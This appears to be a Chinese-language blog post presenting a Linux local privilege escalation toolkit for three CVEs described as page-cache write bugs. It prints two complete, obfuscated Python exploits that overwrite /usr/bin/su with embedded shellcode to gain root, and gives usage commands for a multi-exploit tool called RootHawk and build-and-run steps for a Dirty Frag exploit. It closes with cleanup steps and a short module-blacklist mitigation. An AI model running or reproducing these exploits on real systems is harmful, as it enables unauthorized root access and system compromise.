---
title: Linux 本地提权工具集
published: 2026-06-15 13:37
tags: [安全, Linux, 提权, CVE]
category: 系统
draft: false
---

# Linux 本地提权工具集

## 一、漏洞概述

| CVE | 别名 | 类型 | 内核模块 |
|-----|------|------|----------|
| CVE-2026-31431 | Copy Fail | 页缓存任意写入 | AF_ALG / algif_aead |
| CVE-2026-43284 | Dirty Frag (ESP) | 页缓存任意写入 | XFRM / esp4 / esp6 |
| CVE-2026-43500 | Dirty Frag (RxRPC) | 页缓存任意写入 | RxRPC |

**共同特征：**
- Dirty Pipe 漏洞族的延续，都是利用 `splice()` 将只读文件的页缓存植入内核网络路径，内核 in-place 加解密时直接修改页缓存
- 确定性逻辑漏洞，不依赖竞态条件，成功率高
- 漏洞利用失败不会导致内核 panic

---

## 二、影响环境

### CVE-2026-31431 (Copy Fail)

需 AF_ALG/algif_aead 模块可用：

| 已测试系统 | 结果 |
|------------|:---:|
| AnolisOS | ✅ |
| openEuler | ✅ |
| 统信 UOS | ✅ |
| openKylin | ✅ |
| Ubuntu | ✅ |

### CVE-2026-43284 / CVE-2026-43500 (Dirty Frag)

影响范围 **2017-01-17 至今约 9 年的内核版本**：

| 已测试系统 | 内核版本 | 结果 |
|------------|----------|:---:|
| Ubuntu 24.04.4 | 6.17.0-23-generic | ✅ |
| RHEL 10.1 | 6.12.0-124.49.1 | ✅ |
| openSUSE Tumbleweed | 7.0.2-1-default | ✅ |
| CentOS Stream 10 | 6.12.0-224.el10 | ✅ |
| AlmaLinux 10 | 6.12.0-124.52.3 | ✅ |
| Fedora 44 | 6.19.14-300.fc44 | ✅ |

**链式覆盖逻辑：**
- ESP 路径：需 `unshare(CLONE_NEWUSER)` → 大多数发行版可用
- RxRPC 路径：无需 user namespace，Ubuntu 默认加载 `rxrpc.ko` → 覆盖 AppArmor 限制场景

---

## 三、使用方法

### 方法一：Python 脚本（仅 CVE-2026-31431）

脚本文件：`CVE-2026-31431-linux本地提权/exp.py`、`exp_arm64.py`

```bash
# x86_64
python3 exp.py

# ARM64
python3 exp_arm64.py
```

**exp.py（x86_64 shellcode）：**

```python
#!/usr/bin/env python3
import os as g,zlib,socket as s
def d(x):return bytes.fromhex(x)
def c(f,t,c):
 a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)
 try:u.recv(8+t)
 except:0
f=g.open("/usr/bin/su",0);i=0;e=zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0032c310d3"))
while i<len(e):c(f,i,e[i:i+4]);i+=4
g.system("su")
```

**exp_arm64.py（ARM64 shellcode）：**

```python
#!/usr/bin/env python3
import os as g,zlib,socket as s
def d(x):return bytes.fromhex(x)
def c(f,t,c):
 a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)
 try:u.recv(8+t)
 except:0
f=g.open("/usr/bin/su",0);i=0;e=zlib.decompress(d("789cab77f5716362646480012686ed0c205e05830398efc080091c182c18603a40342b9a2c32bd06caa230181e7dffab08648878bddf7f010c04c1d7400601"))
while i<len(e):c(f,i,e[i:i+4]);i+=4
g.system("su")
```

### 方法二：RootHawk 集成工具

项目地址：https://github.com/dacj4n/RootHawk

RootHawk 整合了多个提权模块的 Go 二进制文件。

**选择对应架构：**
- `RootHawk-amd64` — x86_64
- `RootHawk-arm64` — ARM64
- `RootHawk-386` — 32位 x86

```bash
chmod +x RootHawk-amd64

# 查看帮助
./RootHawk-amd64 -help

# 查看模块列表
./RootHawk-amd64 -list

# 执行 Copy Fail
./RootHawk-amd64 -e CVE-2026-31431

# 先备份后提权
./RootHawk-amd64 -e CVE-2026-31431 -backup /tmp/su.bak

# 提权后执行指定程序
./RootHawk-amd64 -e CVE-2026-31431 -backup /tmp/su.bak -exec /tmp/root-task

# 执行 Dirty Frag（详细输出）
./RootHawk-amd64 -e CVE-2026-43284 -v

# 依次执行全部模块
./RootHawk-amd64 -any
```

### 方法三：Dirty Frag 源码编译

项目地址：https://github.com/dacj4n/dirtyfrag
源码文件：`dirtyfrag/exp.c`

```bash
git clone https://github.com/dacj4n/dirtyfrag.git
cd dirtyfrag
gcc -O0 -Wall -o exp exp.c -lutil
./exp
```

---

## 四、执行后清理（重要）

Dirty Frag 运行后页缓存被污染，需 root 执行：

```bash
echo 3 > /proc/sys/vm/drop_caches
```

或直接**重启系统**。

---

## 五、RootHawk 完整参数

```
-list              显示已集成的 CVE 模块
-e <名称>          执行指定 CVE
-any               按顺序执行全部模块
-pk <路径>         指定 pkexec 路径（默认 /usr/bin/pkexec）
-backup <路径>     CVE-2026-31431 提权前备份 su
-exec <路径>       CVE-2026-31431 提权后执行指定程序
-v                 输出详细日志
-help              显示帮助
```

---

## 六、临时缓解

补丁未发布前：

```bash
sh -c "printf 'install esp4 /bin/false\ninstall esp6 /bin/false\ninstall rxrpc /bin/false\n' > /etc/modprobe.d/dirtyfrag.conf; rmmod esp4 esp6 rxrpc 2>/dev/null; echo 3 > /proc/sys/vm/drop_caches; true"
```
